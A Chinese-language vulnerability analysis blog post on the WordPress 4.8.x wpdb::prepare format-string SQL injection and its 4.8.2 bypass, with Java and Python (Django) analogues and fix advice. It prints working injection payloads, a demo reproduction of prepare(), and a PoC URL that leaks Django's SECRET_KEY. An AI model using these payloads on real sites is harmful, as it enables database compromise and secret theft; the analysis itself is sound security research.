---
layout: post
title:  wordpress 格式化字符串注入
date: 2017-11-2
categories: 漏洞分析
excerpt: wordpress 格式化字符串注入，漏洞利用难度很大，但是格式化字符串注入新颖程度和利用技巧都值得学习，总结产生漏洞原因：通过两次格式化拼接 来组装一条语句，在第一条语句预设占位符就可以很容易绕过各种过滤造成注入漏洞。漏洞背景:wordpress第一次漏洞在4.8.2被修复，再次被绕过，目前最新版是4.8.3 
tags: php sql注入
---


* content
{:toc}


## wordpress 格式化字符串注入

wordpress 格式化字符串注入，漏洞利用难度很大，但是格式化字符串注入新颖程度和利用技巧都值得学习，总结产生漏洞原因：通过两次格式化拼接 来组装一条语句，在第一条语句预设占位符就可以很容易绕过各种过滤造成注入漏洞。漏洞背景:wordpress第一次漏洞在4.8.2被修复，再次被绕过，目前最新版是4.8.3。

不只是```php```语言，其他语言被错误使用也会产生类似漏洞，最后有一个```java```和```python```扩展



## 漏洞分析

### 格式化注入漏洞介绍

在各种语言的使用中，使用格式化字符串输出有很多优点，但是错误的使用格式化来拼接字符串也会造成漏洞。

绝对占位符使用，php语言

	vsprintf('%s, %d, %s', ["a", 1, "b"]); // "a, 1, b"
	vsprintf('%s, %d, %1$s', ["a", 2, "b"]); // "a, 2, a"

其中```%n$s```表示读取第n个占位符的数据，自己不会纳入占位符序号内

产生漏洞原因：通过两次格式化拼接 来组装一条语句，在第一条语句预设占位符就可以很容易绕过各种过滤造成注入漏洞。

### php格式化字符串漏洞小demo

 ```$items``` 和 ```$baz``` 是用户可控数据，两次拼接得到```string_a```作为sql查询子句

	$items = '%1$c) or 1=1 /*';
	$baz = 39;

	$string_a = "where bar in ('$items') and baz = %s" ;
	$string_a = vsprintf($string_a, $baz);
	echo $string_a;
	
sprintf和vsprintf都允许绝对引用，使用```%n$s```不会去读下一个参数，而是会读第n个占位符的数据，而占位符```%c```像```chr()```类似，把数字转换成字符，39是```'```的ascii码，所以就可以在sql注入中造成单引号逃逸

最后输出结果

	SELECT * FROM foo WHERE bar IN ('') OR 1 = 1 /*' AND baz = 39;

这是一个很惊喜的操作

### wp漏洞实例 

在wordpress4.8.1源码中有如下源码

	if ( $delete_all ) {
		$value_clause = '';
		if ( '' !== $meta_value && null !== $meta_value && false !== $meta_value ) {
			$value_clause = $wpdb->prepare( " AND meta_value = %s", $meta_value );
		}

		$object_ids = $wpdb->get_col( $wpdb->prepare( "SELECT $type_column FROM $table WHERE meta_key = %s $value_clause", $meta_key ) );
	}

现实环境中很难同时控制```$meta_key```和```$value_clause($meta_value)```,所以对这个漏洞进行利用非常困难。为了分析方便，来构造一个类wp的小demo，输出可以进行逃逸的sql语句为成功，注: 将```$meta_key```和```$meta_value```视为用户可控，prepare代码在附录中，在prepare中对用户输入做了过滤。

	$meta_key = '39';
	$meta_value = '%1$c or 1=1 /*';

	$value_clause = prepare( " AND meta_value = %s", $meta_value );
	$type_column = 'test';
	$table = 'test';
	$string_b = prepare( "SELECT $type_column FROM $table WHERE meta_key = %s $value_clause", $meta_key );
	echo $string_b;

最后输出 ```$string_b``` 为 ```SELECT test FROM test WHERE meta_key = '39'  AND meta_value = '' or 1=1 /*'```,一番很理论的操作之后得到的结果。

### 4.8.2代码修复

wordpress 在prepare中添加了过滤代码

	$query = preg_replace( '/%(?:%|$|([^dsF]))/', '%%\\1', $query ); // escape any unescaped percents 

1. 正则表达式只允许 %d,%s和%F，数字，字符串和浮点数三种类型
2. 使%n$s这种绝对位置不合法

这样修复导致了 大量使用 ```%4s```这样占位符的代码出现问题,(理论上)

	$db->prepare("SELECT * FROM foo WHERE name= '%4s' AND user_id = %d", $_GET['name'], get_current_user_id());

在这样点的代码中```%4s```会成为```%%4s```,```$_GET['name']``` 输出在```user_id = %d```，攻击者控制```user_id```.

绕过

	$meta_key = ['dump', 'or 1=1 /*'];
	$meta_value = ' %s ';

注意meta_value变量值 空格%s空格
	
	1.初始值
	query = "AND meta_value = %s"
	2.经过 $query = preg_replace( '|(?<!%)%s|', "'%s'", $query ); 替%s得到'%s'
	query = "AND meta_value = '%s'"
	3.格式化字符串输出vsprintf(query,args); args = ' %s '
	query = "AND meta_value = ' %s '"
	4.拼接字符串"SELECT $type_column FROM $table WHERE meta_key = %s $value_clause"
	query = "SELECT test FROM test WHERE meta_key = %s  AND meta_value = ' %s '"
	5.str_replace( "'%s'", '%s', $query ); // in case someone mistakenly already singlequoted it 原来是将'%s'替换成%s的操作，但是因为' %s '不满足字符串匹配条件
	query = "SELECT test FROM test WHERE meta_key = %s  AND meta_value = ' %s '"
	6.经过正则匹配过滤 $query = preg_replace( '|(?<!%)%s|', "'%s'", $query ); 替换%s得到'%s'
	query = "SELECT test FROM test WHERE meta_key = '%s'  AND meta_value = ' '%s' '"
	7.拼接字符串输出vsprintf(query,args); args=['dump', 'or 1=1 /*']
	query= "SELECT test FROM test WHERE meta_key = 'dump'  AND meta_value = ' 'or 1=1 /*' '"

可以看到输出query已经经过了单引号逃逸

### php格式化漏洞扩展

在参考2中提了另一种单引号逃逸，``` %1$'%s'``` 其中 ```%```构成padding，使```'```逃逸
![](https://raw.githubusercontent.com/SuperXiaoxiong/SuperXiaoxiong.github.io/master/img/wpdb_sql.PNG)


	Example #8 printf(): string specifiers
	
	<?php
	$s = 'monkey';
	$t = 'many monkeys';
	
	printf("[%s]\n",      $s); // standard string output
	printf("[%10s]\n",    $s); // right-justification with spaces
	printf("[%-10s]\n",   $s); // left-justification with spaces
	printf("[%010s]\n",   $s); // zero-padding works on strings too
	printf("[%'#10s]\n",  $s); // use the custom padding character '#'
	printf("[%10.10s]\n", $t); // left-justification but with a cutoff of 10 characters
	?>
	以上例程会输出：
	
	[monkey]
	[    monkey]
	[monkey    ]
	[0000monkey]
	[####monkey]
	[many monke]

## 修复

### 简单修复

不允许用户的输入传入query，构造查询语句，可以构造查询模板

### 缓和修复

使用随机生成占位符替换%,查询之前在替换回来

[wp官方漏洞4.8.3修复代码](https://github.com/WordPress/WordPress/blob/4.8.3/wp-includes/wp-db.php)

## 其他语言漏洞扩展

### java

java也有同样的格式化漏洞，构造一个小demo，TODO:收集和挖掘各种实际漏洞

	StringBuilder sb = new StringBuilder();
	Formatter formatter = new Formatter(sb, Locale.US);
	formatter.format("%s %s '%2$c %1$s", "a", 39, "c", "d");
	System.out.println(formatter);

	output: a 39 '' a

自己构思的一个小例子，营养价值不高，但说明漏洞存在于 两次格式化语句拼接而不是在于选用的语言

### python

漏洞看的多的，就有感觉了，以前还是积累太少，以后每次对漏洞分析都要及时总结、回顾、更新

一月份看到phithon的python格式化漏洞并没有理解透，这次一出现格式化漏洞就想到了p牛的文章，python的格式化漏洞影响会更严重，因为不仅有绝对占位符```{n}```，改变语句格式，还可以通过格式化字符串获取对象属性。

	def view(request, *args, **kwargs):
	    template = 'Hello {user}, This is your email: ' + request.GET.get('email')
	    return HttpResponse(template.format(user=request.user))

	poc:
	http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}
	http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}

仔细分析：通过第一次格式化改变了语句结构，第二次格式化进行赋值，获取信息，[phithon这篇博客地址](https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html)

## 参考链接

1. [针对wp中sql查询设计存在的不合理和漏洞分析原文](https://blog.ircmaxell.com/2017/10/disclosure-wordpress-wpdb-sql-injection-technical.html)
2. [404实验室分析](https://paper.seebug.org/386/)

## 附录

	$query = preg_replace( '/%(?:%|$|([^dsF]))/', '%%\\1', $query ); 
4.8.1及之前，这条语句不存在，4.8.2加入，是一次错误的修复
	
	function prepare( $query, $args ) {
	    if ( is_null( $query ) )
	        return;
	
	    // This is not meant to be foolproof -- but it will catch obviously incorrect usage.
	    if ( strpos( $query, '%' ) === false ) {
	        //_doing_it_wrong( 'wpdb::prepare', sprintf( __( 'The query argument of %s must have a placeholder.' ), 'wpdb::prepare()' ), '3.9.0' );
	        echo $query;
	        echo '\r\n';
	    }
	
	    $args = func_get_args();
	    array_shift( $args );
	    // If args were passed as an array (as in vsprintf), move them up
	    if ( isset( $args[0] ) && is_array($args[0]) )
	        $args = $args[0];
	    $query = str_replace( "'%s'", '%s', $query ); // in case someone mistakenly already singlequoted it
	    $query = str_replace( '"%s"', '%s', $query ); // doublequote unquoting
	    $query = preg_replace( '|(?<!%)%f|' , '%F', $query ); // Force floats to be locale unaware
	    $query = preg_replace( '|(?<!%)%s|', "'%s'", $query ); // quote the strings, avoiding escaped strings like %%s
	    //$query = preg_replace( '/%(?:%|$|([^dsF]))/', '%%\\1', $query ); // escape any unescaped percents
	    array_walk( $args, array( $this, 'escape_by_ref' ) );
	    return @vsprintf( $query, $args );
	}


